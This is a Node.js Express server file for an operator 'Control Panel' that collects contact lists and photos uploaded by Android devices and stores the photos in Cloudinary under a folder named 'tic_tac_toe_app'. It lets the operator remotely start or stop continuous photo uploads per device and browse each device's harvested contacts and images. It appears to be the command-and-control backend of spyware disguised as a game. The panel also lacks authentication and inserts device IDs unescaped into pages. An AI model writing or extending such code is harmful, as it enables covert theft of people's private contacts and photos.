const express = require("express");
const { Pool } = require("pg");
const cloudinary = require("cloudinary").v2;
const multer = require("multer");

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const upload = multer({ storage: multer.memoryStorage() });

// ================= CLOUDINARY =================
cloudinary.config({
  cloud_name: process.env.CLOUD_NAME,
  api_key: process.env.API_KEY,
  api_secret: process.env.API_SECRET
});

// ================= DATABASE =================
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

// ================= DB SETUP =================
async function initDB() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS users (
      id SERIAL PRIMARY KEY,
      device_id TEXT UNIQUE
    );

    CREATE TABLE IF NOT EXISTS images (
      id SERIAL PRIMARY KEY,
      device_id TEXT,
      image_url TEXT,
      cloudinary_public_id TEXT
    );

    CREATE TABLE IF NOT EXISTS contacts (
      id SERIAL PRIMARY KEY,
      device_id TEXT,
      contact TEXT
    );

    CREATE TABLE IF NOT EXISTS device_control (
      device_id TEXT PRIMARY KEY,
      uploading BOOLEAN DEFAULT FALSE
    );
  `);

  // Add cloudinary_public_id column if it doesn't exist (for existing DBs)
  await pool.query(`
    ALTER TABLE images ADD COLUMN IF NOT EXISTS cloudinary_public_id TEXT;
  `);
}
initDB();

// ================= SHARED STYLES =================
const sharedStyles = `
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: #0a0f1e;
      color: #e2e8f0;
      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
      min-height: 100vh;
    }
    .topbar {
      background: #0d1526;
      border-bottom: 1px solid #1e2d4a;
      padding: 16px 32px;
      display: flex;
      align-items: center;
      gap: 12px;
      position: sticky;
      top: 0;
      z-index: 100;
    }
    .topbar .logo {
      font-size: 20px;
      font-weight: 700;
      color: #22c55e;
      letter-spacing: -0.5px;
      text-decoration: none;
    }
    .topbar nav { margin-left: auto; display: flex; gap: 8px; }
    .topbar nav a {
      color: #94a3b8;
      text-decoration: none;
      padding: 8px 14px;
      border-radius: 8px;
      font-size: 14px;
      transition: all 0.2s;
    }
    .topbar nav a:hover { background: #1e2d4a; color: #e2e8f0; }
    .page { padding: 36px 32px; max-width: 1100px; margin: 0 auto; }
    .page-title { font-size: 26px; font-weight: 700; color: #f1f5f9; margin-bottom: 6px; }
    .page-subtitle { font-size: 14px; color: #64748b; margin-bottom: 32px; }
    .card {
      background: #0d1526;
      border: 1px solid #1e2d4a;
      border-radius: 14px;
      padding: 24px;
      margin-bottom: 20px;
    }
    .card h3 {
      font-size: 15px;
      font-weight: 600;
      color: #cbd5e1;
      margin-bottom: 18px;
      padding-bottom: 14px;
      border-bottom: 1px solid #1e2d4a;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .stat-card {
      background: #0d1526;
      border: 1px solid #1e2d4a;
      border-radius: 14px;
      padding: 28px 32px;
      margin-bottom: 24px;
      display: flex;
      align-items: center;
      gap: 24px;
    }
    .stat-icon-wrap {
      width: 56px; height: 56px;
      border-radius: 14px;
      background: #0d2d1a;
      display: flex; align-items: center; justify-content: center;
      font-size: 24px;
      flex-shrink: 0;
    }
    .stat-label { font-size: 13px; color: #64748b; text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 4px; }
    .stat-value { font-size: 42px; font-weight: 700; color: #f1f5f9; line-height: 1; }
    .btn {
      padding: 10px 20px;
      border-radius: 8px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      border: none;
      transition: all 0.2s;
      text-decoration: none;
      display: inline-flex;
      align-items: center;
      gap: 6px;
    }
    .btn-primary { background: #22c55e; color: #052e16; }
    .btn-primary:hover { background: #16a34a; }
    .btn-secondary { background: transparent; border: 1px solid #1e2d4a; color: #94a3b8; }
    .btn-secondary:hover { background: #1e2d4a; color: #e2e8f0; }
    .btn-blue { background: #1d4ed8; color: #fff; }
    .btn-blue:hover { background: #1e40af; }
    .btn-green { background: #15803d; color: #f0fdf4; }
    .btn-green:hover { background: #166534; }
    .btn-red { background: #dc2626; color: #fff; }
    .btn-red:hover { background: #b91c1c; }
    .btn-start { background: #22c55e; color: #052e16; padding: 12px 28px; font-size: 15px; border-radius: 10px; }
    .btn-start:hover { background: #16a34a; }
    .btn-stop { background: #dc2626; color: #fff; padding: 12px 28px; font-size: 15px; border-radius: 10px; }
    .btn-stop:hover { background: #b91c1c; }

    .user-list { display: flex; flex-direction: column; gap: 12px; }
    .user-row {
      background: #0d1526;
      border: 1px solid #1e2d4a;
      border-radius: 12px;
      padding: 16px 20px;
      display: flex;
      align-items: center;
      gap: 16px;
    }
    .user-avatar {
      width: 42px; height: 42px;
      border-radius: 50%;
      background: #0d2d1a;
      border: 1px solid #22c55e44;
      display: flex; align-items: center; justify-content: center;
      font-size: 14px;
      font-weight: 700;
      color: #22c55e;
      flex-shrink: 0;
    }
    .user-id { font-size: 14px; font-weight: 500; color: #cbd5e1; flex: 1; word-break: break-all; }
    .user-actions { display: flex; gap: 10px; flex-shrink: 0; flex-wrap: wrap; }

    .images-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
      gap: 14px;
    }
    .img-wrapper {
      border-radius: 12px;
      overflow: hidden;
      border: 2px solid #1e2d4a;
      aspect-ratio: 1;
      background: #131f38;
      position: relative;
      cursor: pointer;
      transition: border-color 0.2s;
    }
    .img-wrapper.selected { border-color: #dc2626; }
    .img-wrapper img {
      width: 100%; height: 100%;
      object-fit: cover;
      display: block;
      transition: transform 0.3s;
    }
    .img-wrapper:hover img { transform: scale(1.06); }
    .img-checkbox {
      position: absolute;
      top: 8px; left: 8px;
      width: 22px; height: 22px;
      accent-color: #dc2626;
      cursor: pointer;
      z-index: 2;
    }
    .img-delete-btn {
      position: absolute;
      top: 6px; right: 6px;
      background: #dc2626;
      color: #fff;
      border: none;
      border-radius: 6px;
      padding: 4px 8px;
      font-size: 11px;
      font-weight: 700;
      cursor: pointer;
      z-index: 2;
      display: none;
      transition: background 0.2s;
    }
    .img-wrapper:hover .img-delete-btn { display: block; }
    .img-delete-btn:hover { background: #b91c1c; }

    .empty-state { padding: 28px; text-align: center; color: #334155; font-size: 14px; }

    .contacts-table { width: 100%; border-collapse: collapse; }
    .contacts-table th {
      text-align: left;
      font-size: 11px;
      color: #475569;
      text-transform: uppercase;
      letter-spacing: 0.8px;
      padding: 0 16px 12px;
    }
    .contacts-table td {
      padding: 12px 16px;
      font-size: 14px;
      color: #cbd5e1;
      border-top: 1px solid #1e2d4a;
    }
    .contacts-table tr:hover td { background: #131f38; }
    .contact-name { display: flex; align-items: center; gap: 10px; }
    .contact-dot { width: 7px; height: 7px; border-radius: 50%; background: #22c55e; flex-shrink: 0; }
    .count-badge {
      display: inline-flex;
      align-items: center;
      padding: 3px 10px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: 600;
      background: #22c55e18;
      color: #22c55e;
      border: 1px solid #22c55e33;
      margin-left: 6px;
    }
    .status-badge-on {
      display: inline-flex; align-items: center; gap: 6px;
      padding: 4px 12px; border-radius: 20px;
      font-size: 12px; font-weight: 600;
      background: #22c55e22; color: #22c55e;
      border: 1px solid #22c55e44;
    }
    .status-badge-off {
      display: inline-flex; align-items: center; gap: 6px;
      padding: 4px 12px; border-radius: 20px;
      font-size: 12px; font-weight: 600;
      background: #dc262622; color: #f87171;
      border: 1px solid #dc262644;
    }
    .pulse { width: 7px; height: 7px; border-radius: 50%; background: #22c55e; animation: pulse 1.5s infinite; }
    @keyframes pulse {
      0%, 100% { opacity: 1; } 50% { opacity: 0.3; }
    }
    .dot-off { width: 7px; height: 7px; border-radius: 50%; background: #f87171; }

    .bulk-actions {
      display: flex;
      align-items: center;
      gap: 12px;
      margin-bottom: 16px;
      padding: 12px 16px;
      background: #0a1628;
      border: 1px solid #1e2d4a;
      border-radius: 10px;
      flex-wrap: wrap;
    }
    .bulk-actions label { font-size: 14px; color: #94a3b8; display: flex; align-items: center; gap: 8px; cursor: pointer; }
    .bulk-actions input[type=checkbox] { width: 17px; height: 17px; accent-color: #dc2626; cursor: pointer; }
    .selected-count { font-size: 13px; color: #94a3b8; margin-left: 4px; }

    .confirm-modal {
      display: none;
      position: fixed; inset: 0;
      background: rgba(0,0,0,0.7);
      z-index: 999;
      align-items: center;
      justify-content: center;
    }
    .confirm-modal.open { display: flex; }
    .confirm-box {
      background: #0d1526;
      border: 1px solid #dc262666;
      border-radius: 16px;
      padding: 32px;
      max-width: 400px;
      width: 90%;
      text-align: center;
    }
    .confirm-box h2 { font-size: 20px; color: #f1f5f9; margin-bottom: 10px; }
    .confirm-box p { font-size: 14px; color: #94a3b8; margin-bottom: 24px; }
    .confirm-box .actions { display: flex; gap: 12px; justify-content: center; }
  </style>
`;

// ================= TOPBAR HELPER =================
function topbar() {
  return `
    <div class="topbar">
      <a href="/" class="logo">&#9670; Control Panel</a>
      <nav>
        <a href="/">Dashboard</a>
        <a href="/users">Users</a>
      </nav>
    </div>
  `;
}

// ================= CONFIG ENDPOINT (called by Android app) =================
// FIX: Auto-insert device row so new devices always get a valid config response
app.get("/config/:device_id", async (req, res) => {
  const device_id = req.params.device_id;

  // Upsert: create row with uploading=false if it doesn't exist yet
  await pool.query(
    `INSERT INTO device_control (device_id, uploading) VALUES ($1, FALSE)
     ON CONFLICT (device_id) DO NOTHING`,
    [device_id]
  );

  const result = await pool.query(
    "SELECT uploading FROM device_control WHERE device_id=$1",
    [device_id]
  );
  const uploading = result.rows.length > 0 ? result.rows[0].uploading : false;
  res.json({ uploading });
});

// ================= START / STOP UPLOAD CONTROL =================
app.post("/control/:device_id/start", async (req, res) => {
  const { device_id } = req.params;
  await pool.query(
    `INSERT INTO device_control (device_id, uploading) VALUES ($1, TRUE)
     ON CONFLICT (device_id) DO UPDATE SET uploading = TRUE`,
    [device_id]
  );
  res.redirect("/user/" + device_id + "/images");
});

app.post("/control/:device_id/stop", async (req, res) => {
  const { device_id } = req.params;
  await pool.query(
    `INSERT INTO device_control (device_id, uploading) VALUES ($1, FALSE)
     ON CONFLICT (device_id) DO UPDATE SET uploading = FALSE`,
    [device_id]
  );
  res.redirect("/user/" + device_id + "/images");
});

// ================= DASHBOARD =================
app.get("/", async (req, res) => {
  const users = await pool.query("SELECT COUNT(*) FROM users");

  res.send(`
  <html><head><title>Dashboard</title>${sharedStyles}</head>
  <body>
    ${topbar()}
    <div class="page">
      <div class="page-title">Dashboard</div>
      <div class="page-subtitle">Control panel overview</div>

      <div class="stat-card">
        <div class="stat-icon-wrap">&#128100;</div>
        <div>
          <div class="stat-label">Total Users</div>
          <div class="stat-value">${users.rows[0].count}</div>
        </div>
      </div>

      <a href="/users" class="btn btn-primary" style="font-size:16px; padding:14px 32px;">
        &#128101;&nbsp; View Users
      </a>
    </div>
  </body></html>
  `);
});

// ================= RECEIVE CONTACTS =================
app.post("/receive", async (req, res) => {
  const { device_id, data } = req.body;
  for (let contact of data) {
    await pool.query(
      "INSERT INTO contacts (device_id, contact) VALUES ($1, $2)",
      [device_id, contact]
    );
  }
  await pool.query(
    "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
    [device_id]
  );
  res.send("Contacts saved ✅");
});

// ================= IMAGE UPLOAD =================
app.post("/upload-image", upload.single("image"), async (req, res) => {
  try {
    const device_id = req.body.device_id;
    const stream = cloudinary.uploader.upload_stream(
      { folder: "tic_tac_toe_app" },
      async (error, result) => {
        if (error) return res.status(500).send("Upload error");
        const imageUrl = result.secure_url;
        const publicId = result.public_id;
        await pool.query(
          "INSERT INTO images (device_id, image_url, cloudinary_public_id) VALUES ($1, $2, $3)",
          [device_id, imageUrl, publicId]
        );
        await pool.query(
          "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
          [device_id]
        );
        res.json({ url: imageUrl });
      }
    );
    stream.end(req.file.buffer);
  } catch (err) {
    res.status(500).send("Server error");
  }
});

// ================= DELETE SINGLE IMAGE =================
app.post("/delete-image/:image_id", async (req, res) => {
  const { image_id } = req.params;
  const { device_id } = req.body;
  try {
    const row = await pool.query("SELECT * FROM images WHERE id=$1", [image_id]);
    if (row.rows.length > 0 && row.rows[0].cloudinary_public_id) {
      await cloudinary.uploader.destroy(row.rows[0].cloudinary_public_id);
    }
    await pool.query("DELETE FROM images WHERE id=$1", [image_id]);
    res.redirect("/user/" + device_id + "/images");
  } catch (err) {
    res.status(500).send("Error deleting image");
  }
});

// ================= DELETE SELECTED IMAGES =================
app.post("/delete-images-selected", async (req, res) => {
  const { device_id, image_ids } = req.body;
  try {
    const ids = Array.isArray(image_ids) ? image_ids : [image_ids];
    for (const id of ids) {
      const row = await pool.query("SELECT * FROM images WHERE id=$1", [id]);
      if (row.rows.length > 0 && row.rows[0].cloudinary_public_id) {
        await cloudinary.uploader.destroy(row.rows[0].cloudinary_public_id);
      }
      await pool.query("DELETE FROM images WHERE id=$1", [id]);
    }
    res.redirect("/user/" + device_id + "/images");
  } catch (err) {
    res.status(500).send("Error deleting images");
  }
});

// ================= DELETE ALL IMAGES FOR DEVICE =================
app.post("/delete-all-images/:device_id", async (req, res) => {
  const { device_id } = req.params;
  try {
    const rows = await pool.query("SELECT cloudinary_public_id FROM images WHERE device_id=$1", [device_id]);
    for (const row of rows.rows) {
      if (row.cloudinary_public_id) {
        await cloudinary.uploader.destroy(row.cloudinary_public_id);
      }
    }
    await pool.query("DELETE FROM images WHERE device_id=$1", [device_id]);
    res.redirect("/user/" + device_id + "/images");
  } catch (err) {
    res.status(500).send("Error deleting all images");
  }
});

// ================= DELETE SELECTED CONTACTS =================
app.post("/delete-contacts-selected", async (req, res) => {
  const { device_id, contact_ids } = req.body;
  try {
    const ids = Array.isArray(contact_ids) ? contact_ids : [contact_ids];
    for (const id of ids) {
      await pool.query("DELETE FROM contacts WHERE id=$1", [id]);
    }
    res.redirect("/user/" + device_id + "/contacts");
  } catch (err) {
    res.status(500).send("Error deleting contacts");
  }
});

// ================= DELETE ALL CONTACTS FOR DEVICE =================
app.post("/delete-all-contacts/:device_id", async (req, res) => {
  const { device_id } = req.params;
  try {
    await pool.query("DELETE FROM contacts WHERE device_id=$1", [device_id]);
    res.redirect("/user/" + device_id + "/contacts");
  } catch (err) {
    res.status(500).send("Error deleting contacts");
  }
});

// ================= DELETE USER (and all their data) =================
app.post("/delete-user/:device_id", async (req, res) => {
  const { device_id } = req.params;
  try {
    // Delete all images from Cloudinary first
    const rows = await pool.query("SELECT cloudinary_public_id FROM images WHERE device_id=$1", [device_id]);
    for (const row of rows.rows) {
      if (row.cloudinary_public_id) {
        await cloudinary.uploader.destroy(row.cloudinary_public_id);
      }
    }
    await pool.query("DELETE FROM images WHERE device_id=$1", [device_id]);
    await pool.query("DELETE FROM contacts WHERE device_id=$1", [device_id]);
    await pool.query("DELETE FROM device_control WHERE device_id=$1", [device_id]);
    await pool.query("DELETE FROM users WHERE device_id=$1", [device_id]);
    res.redirect("/users");
  } catch (err) {
    res.status(500).send("Error deleting user");
  }
});

// ================= USERS LIST =================
app.get("/users", async (req, res) => {
  const users = await pool.query("SELECT * FROM users");

  let rows = "";
  for (const u of users.rows) {
    const initials = u.device_id.substring(0, 2).toUpperCase();
    const imgCount = await pool.query(
      "SELECT COUNT(*) FROM images WHERE device_id=$1", [u.device_id]
    );
    const conCount = await pool.query(
      "SELECT COUNT(DISTINCT contact) FROM contacts WHERE device_id=$1", [u.device_id]
    );
    rows += `
      <div class="user-row" id="user-${u.device_id}">
        <div class="user-avatar">${initials}</div>
        <div class="user-id">${u.device_id}</div>
        <div class="user-actions">
          <a href="/user/${u.device_id}/contacts" class="btn btn-green">
            &#128222; Contacts <span class="count-badge">${conCount.rows[0].count}</span>
          </a>
          <a href="/user/${u.device_id}/images" class="btn btn-blue">
            &#128247; Images <span class="count-badge">${imgCount.rows[0].count}</span>
          </a>
          <button class="btn btn-red"
            onclick="confirmDeleteUser('${u.device_id}')">
            &#128465; Delete User
          </button>
        </div>
      </div>
    `;
  }

  res.send(`
  <html><head><title>Users</title>${sharedStyles}</head>
  <body>
    ${topbar()}

    <!-- Confirm Delete User Modal -->
    <div class="confirm-modal" id="deleteUserModal">
      <div class="confirm-box">
        <h2>&#9888; Delete User?</h2>
        <p>This will permanently delete the user and <strong>all their images &amp; contacts</strong>. This cannot be undone.</p>
        <div class="actions">
          <button class="btn btn-secondary" onclick="closeModal('deleteUserModal')">Cancel</button>
          <form id="deleteUserForm" method="POST">
            <button type="submit" class="btn btn-red">Yes, Delete</button>
          </form>
        </div>
      </div>
    </div>

    <div class="page">
      <a href="/" class="btn btn-secondary" style="margin-bottom:24px;">&larr; Back</a>
      <div class="page-title" style="margin-top:16px;">All Users</div>
      <div class="page-subtitle">${users.rows.length} registered device(s)</div>
      <div class="user-list">
        ${rows || '<div class="empty-state">No users found.</div>'}
      </div>
    </div>

    <script>
      function confirmDeleteUser(deviceId) {
        document.getElementById('deleteUserForm').action = '/delete-user/' + deviceId;
        document.getElementById('deleteUserModal').classList.add('open');
      }
      function closeModal(id) {
        document.getElementById(id).classList.remove('open');
      }
    </script>
  </body></html>
  `);
});

// ================= USER CONTACTS =================
app.get("/user/:device_id/contacts", async (req, res) => {
  const device = req.params.device_id;

  const contacts = await pool.query(
    "SELECT id, contact FROM contacts WHERE device_id=$1 ORDER BY contact",
    [device]
  );

  let contactRows = "";
  contacts.rows.forEach((c, i) => {
    contactRows += `
      <tr>
        <td style="width:44px; padding-left:16px;">
          <input type="checkbox" class="contact-check" name="contact_ids" value="${c.id}"
            style="width:16px;height:16px;accent-color:#dc2626;cursor:pointer;"
            onchange="updateContactCount()">
        </td>
        <td style="color:#475569; font-size:13px; width:50px;">${i + 1}</td>
        <td><div class="contact-name"><div class="contact-dot"></div>${c.contact}</div></td>
      </tr>
    `;
  });

  res.send(`
  <html><head><title>Contacts - ${device}</title>${sharedStyles}</head>
  <body>
    ${topbar()}

    <!-- Confirm Delete Contacts Modal -->
    <div class="confirm-modal" id="deleteContactsModal">
      <div class="confirm-box">
        <h2>&#9888; Delete Contacts?</h2>
        <p id="deleteContactsMsg">Are you sure you want to delete the selected contacts?</p>
        <div class="actions">
          <button class="btn btn-secondary" onclick="closeModal('deleteContactsModal')">Cancel</button>
          <button class="btn btn-red" onclick="submitContactDelete()">Yes, Delete</button>
        </div>
      </div>
    </div>

    <div class="page">
      <a href="/users" class="btn btn-secondary" style="margin-bottom:24px;">&larr; Back to Users</a>
      <div class="page-title" style="margin-top:16px;">Contacts</div>
      <div class="page-subtitle" style="font-family:monospace;">${device}</div>

      <div class="card" style="padding:0; overflow:hidden;">
        <div style="padding:20px 24px 16px; border-bottom:1px solid #1e2d4a; display:flex; align-items:center; gap:8px; flex-wrap:wrap;">
          <span style="font-size:15px; font-weight:600; color:#cbd5e1;">&#128222; Contact List</span>
          <span class="count-badge">${contacts.rows.length} unique</span>
          <div style="margin-left:auto; display:flex; gap:10px; flex-wrap:wrap;">
            <button class="btn btn-red" style="font-size:13px; padding:8px 14px;"
              onclick="confirmDeleteSelectedContacts()">
              &#128465; Delete Selected (<span id="selectedContactCount">0</span>)
            </button>
            <button class="btn btn-red" style="font-size:13px; padding:8px 14px; background:#7f1d1d;"
              onclick="confirmDeleteAllContacts()">
              &#128465; Delete All
            </button>
          </div>
        </div>

        ${contactRows
          ? `<form id="contactDeleteForm" method="POST" action="/delete-contacts-selected">
              <input type="hidden" name="device_id" value="${device}">
              <div class="bulk-actions" style="margin:12px 16px; border-radius:8px;">
                <label>
                  <input type="checkbox" id="selectAllContacts" onchange="toggleAllContacts(this)">
                  Select All
                </label>
              </div>
              <table class="contacts-table">
                <thead>
                  <tr>
                    <th style="padding:14px 16px 10px; width:44px;"></th>
                    <th style="padding:14px 16px 10px;">#</th>
                    <th style="padding:14px 16px 10px;">Contact</th>
                  </tr>
                </thead>
                <tbody>${contactRows}</tbody>
              </table>
             </form>`
          : '<div class="empty-state">No contacts found.</div>'
        }
      </div>

      <!-- Delete All Contacts form (hidden, submitted via JS) -->
      <form id="deleteAllContactsForm" method="POST" action="/delete-all-contacts/${device}" style="display:none;"></form>
    </div>

    <script>
      function updateContactCount() {
        const count = document.querySelectorAll('.contact-check:checked').length;
        document.getElementById('selectedContactCount').textContent = count;
      }
      function toggleAllContacts(cb) {
        document.querySelectorAll('.contact-check').forEach(c => c.checked = cb.checked);
        updateContactCount();
      }
      function confirmDeleteSelectedContacts() {
        const count = document.querySelectorAll('.contact-check:checked').length;
        if (count === 0) { alert('Please select at least one contact.'); return; }
        document.getElementById('deleteContactsMsg').textContent =
          'Delete ' + count + ' selected contact(s)? This cannot be undone.';
        document.getElementById('deleteContactsModal').classList.add('open');
      }
      function confirmDeleteAllContacts() {
        document.getElementById('deleteContactsMsg').textContent =
          'Delete ALL ${contacts.rows.length} contacts? This cannot be undone.';
        document.getElementById('deleteContactsModal').classList.add('open');
        document.getElementById('deleteContactsModal').dataset.deleteAll = 'true';
      }
      function submitContactDelete() {
        const modal = document.getElementById('deleteContactsModal');
        if (modal.dataset.deleteAll === 'true') {
          modal.dataset.deleteAll = '';
          document.getElementById('deleteAllContactsForm').submit();
        } else {
          document.getElementById('contactDeleteForm').submit();
        }
      }
      function closeModal(id) {
        const el = document.getElementById(id);
        el.classList.remove('open');
        if (el.dataset) el.dataset.deleteAll = '';
      }
    </script>
  </body></html>
  `);
});

// ================= USER IMAGES (with Start/Stop + Delete) =================
app.get("/user/:device_id/images", async (req, res) => {
  const device = req.params.device_id;

  const images = await pool.query(
    "SELECT * FROM images WHERE device_id=$1 ORDER BY id DESC",
    [device]
  );

  const controlRow = await pool.query(
    "SELECT uploading FROM device_control WHERE device_id=$1",
    [device]
  );
  const isUploading = controlRow.rows.length > 0 ? controlRow.rows[0].uploading : false;

  let imgGrid = "";
  images.rows.forEach(img => {
    imgGrid += `
      <div class="img-wrapper" id="img-${img.id}" onclick="toggleImgSelect(${img.id}, event)">
        <input type="checkbox" class="img-checkbox" name="image_ids" value="${img.id}"
          onchange="updateImgCount()" onclick="event.stopPropagation()">
        <img src="${img.image_url}" alt="device image" loading="lazy"/>
        <form method="POST" action="/delete-image/${img.id}" style="position:absolute;top:6px;right:6px;z-index:3;">
          <input type="hidden" name="device_id" value="${device}">
          <button type="submit" class="img-delete-btn" onclick="event.stopPropagation()">&#10005; Del</button>
        </form>
      </div>
    `;
  });

  const statusBadge = isUploading
    ? `<span class="status-badge-on"><span class="pulse"></span> Uploading Active</span>`
    : `<span class="status-badge-off"><span class="dot-off"></span> Stopped</span>`;

  res.send(`
  <html><head><title>Images - ${device}</title>${sharedStyles}</head>
  <body>
    ${topbar()}

    <!-- Confirm Delete Images Modal -->
    <div class="confirm-modal" id="deleteImagesModal">
      <div class="confirm-box">
        <h2>&#9888; Delete Images?</h2>
        <p id="deleteImagesMsg">Are you sure you want to delete the selected images?</p>
        <div class="actions">
          <button class="btn btn-secondary" onclick="closeModal('deleteImagesModal')">Cancel</button>
          <button class="btn btn-red" onclick="submitImageDelete()">Yes, Delete</button>
        </div>
      </div>
    </div>

    <div class="page">
      <a href="/users" class="btn btn-secondary" style="margin-bottom:24px;">&larr; Back to Users</a>
      <div class="page-title" style="margin-top:16px;">Images</div>
      <div class="page-subtitle" style="font-family:monospace;">${device}</div>

      <!-- Upload Control Card -->
      <div class="card">
        <h3>&#9881; Upload Control &nbsp; ${statusBadge}</h3>
        <p style="font-size:13px; color:#64748b; margin-bottom:20px;">
          Start to allow the device to upload images continuously. Stop to pause all uploads from this device.
        </p>
        <div style="display:flex; gap:14px;">
          <form method="POST" action="/control/${device}/start">
            <button type="submit" class="btn btn-start" ${isUploading ? 'disabled style="opacity:0.4;cursor:not-allowed;"' : ''}>
              &#9654; Start Upload
            </button>
          </form>
          <form method="POST" action="/control/${device}/stop">
            <button type="submit" class="btn btn-stop" ${!isUploading ? 'disabled style="opacity:0.4;cursor:not-allowed;"' : ''}>
              &#9632; Stop Upload
            </button>
          </form>
        </div>
      </div>

      <!-- Images Card -->
      <div class="card">
        <h3 style="flex-wrap:wrap; gap:10px;">
          &#128247; Received Images
          <span class="count-badge">${images.rows.length}</span>
          <div style="margin-left:auto; display:flex; gap:10px; flex-wrap:wrap;">
            <button class="btn btn-red" style="font-size:13px; padding:8px 14px;"
              onclick="confirmDeleteSelectedImages()">
              &#128465; Delete Selected (<span id="selectedImgCount">0</span>)
            </button>
            <button class="btn btn-red" style="font-size:13px; padding:8px 14px; background:#7f1d1d;"
              onclick="confirmDeleteAllImages()">
              &#128465; Delete All
            </button>
          </div>
        </h3>

        ${images.rows.length > 0 ? `
          <form id="imgDeleteForm" method="POST" action="/delete-images-selected">
            <input type="hidden" name="device_id" value="${device}">
            <div class="bulk-actions">
              <label>
                <input type="checkbox" id="selectAllImgs" onchange="toggleAllImages(this)">
                Select All
              </label>
              <span class="selected-count">Click images or use checkboxes to select</span>
            </div>
            <div class="images-grid">
              ${imgGrid}
            </div>
          </form>
        ` : '<div class="empty-state">No images uploaded yet.</div>'}

        <!-- Delete All Images form (hidden) -->
        <form id="deleteAllImgsForm" method="POST" action="/delete-all-images/${device}" style="display:none;"></form>
      </div>
    </div>

    <script>
      function toggleImgSelect(id, event) {
        const wrapper = document.getElementById('img-' + id);
        const checkbox = wrapper.querySelector('.img-checkbox');
        checkbox.checked = !checkbox.checked;
        wrapper.classList.toggle('selected', checkbox.checked);
        updateImgCount();
      }
      function updateImgCount() {
        const checked = document.querySelectorAll('.img-checkbox:checked');
        document.getElementById('selectedImgCount').textContent = checked.length;
        document.querySelectorAll('.img-wrapper').forEach(w => {
          const cb = w.querySelector('.img-checkbox');
          w.classList.toggle('selected', cb.checked);
        });
      }
      function toggleAllImages(cb) {
        document.querySelectorAll('.img-checkbox').forEach(c => c.checked = cb.checked);
        updateImgCount();
      }
      function confirmDeleteSelectedImages() {
        const count = document.querySelectorAll('.img-checkbox:checked').length;
        if (count === 0) { alert('Please select at least one image.'); return; }
        document.getElementById('deleteImagesMsg').textContent =
          'Delete ' + count + ' selected image(s)? They will be removed from Cloudinary too.';
        document.getElementById('deleteImagesModal').classList.add('open');
      }
      function confirmDeleteAllImages() {
        document.getElementById('deleteImagesMsg').textContent =
          'Delete ALL ${images.rows.length} images? They will be permanently removed from Cloudinary.';
        document.getElementById('deleteImagesModal').classList.add('open');
        document.getElementById('deleteImagesModal').dataset.deleteAll = 'true';
      }
      function submitImageDelete() {
        const modal = document.getElementById('deleteImagesModal');
        if (modal.dataset.deleteAll === 'true') {
          modal.dataset.deleteAll = '';
          document.getElementById('deleteAllImgsForm').submit();
        } else {
          document.getElementById('imgDeleteForm').submit();
        }
      }
      function closeModal(id) {
        const el = document.getElementById(id);
        el.classList.remove('open');
        if (el.dataset) el.dataset.deleteAll = '';
      }
    </script>
  </body></html>
  `);
});

app.listen(process.env.PORT || 3000);
